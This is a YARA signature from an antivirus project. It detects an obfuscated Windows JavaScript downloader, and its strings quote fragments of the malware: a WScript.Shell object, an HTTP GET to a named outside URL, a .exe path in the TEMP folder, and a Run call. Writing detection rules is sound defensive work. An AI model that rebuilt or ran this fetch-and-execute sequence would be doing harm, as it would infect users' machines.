rule sig_20160401_d2b124fb0ad20545a9e82a2de0d9c23c {
  meta:
    description = "datamaliciousorder - file 20160401_d2b124fb0ad20545a9e82a2de0d9c23c.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "de59ce4cd995fcc378b7a421f6e4127b5f9895bfe2c8ae5a4dc53954260278d0"

  strings:
    $s1  = "var EmSyh = function BwQen() {return WScript[ZcmDsa](\"WScript\"+\".Shell\");}(), DduKwe = 11;" fullword ascii
    $s2  = "XrlOb[ZxxXqg](\"G\" + \"ET\", \"http://sirplusalot.net/l1pasw\", false);" fullword ascii
    $s3  = "function TtOw(QxKsn, VkgKv){KsUpc = KsUpc * 1; return QxKsn - VkgKv;};" fullword ascii
    $s4  = "if (XrlOb[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "for (var EbeGm = KsUpc; EbeGm < XkhFa() * 1; EbeGm++){if (BiNk() != KsUpc){" fullword ascii
    $s6  = "function LyKd() {return EmSyh[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"DIVQhA7uDjNo.ex\" + \"e\";};" fullword ascii
    $s7  = "function HymDd(){return VxlTnx + \"\";};" fullword ascii
    $s8  = "function BiNk()" fullword ascii
    $s9  = "function PcMkr(){return ZcmDsa;};" fullword ascii
    $s10 = "function VhzWsx() {return ((NoUth == true) && (NoUth == FpZnh)) ? 1 : KsUpc;};" fullword ascii
    $s11 = "FpZnh = true; " fullword ascii
    $s12 = "var NoUth = false;" fullword ascii
    $s13 = "function PbOna(QcsRfd) {var WxZvi = (1, 2, 3, 4, 5, QcsRfd); return WxZvi;};" fullword ascii
    $s14 = "var WltHvp = false;" fullword ascii
    $s15 = "NoUth = true; " fullword ascii
    $s16 = "return TtOw(DkcRou, TwiGvn);" fullword ascii
    $s17 = "function PrCw(JkGuh){EmSyh[\"R\"+\"un\"](JkGuh, KsUpc, KsUpc);};" fullword ascii
    $s18 = "var FpZnh = false;" fullword ascii
    $s19 = "var PonAdk = new this[\"Date\"]();" fullword ascii
    $s20 = "function XkhFa(){return 23;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}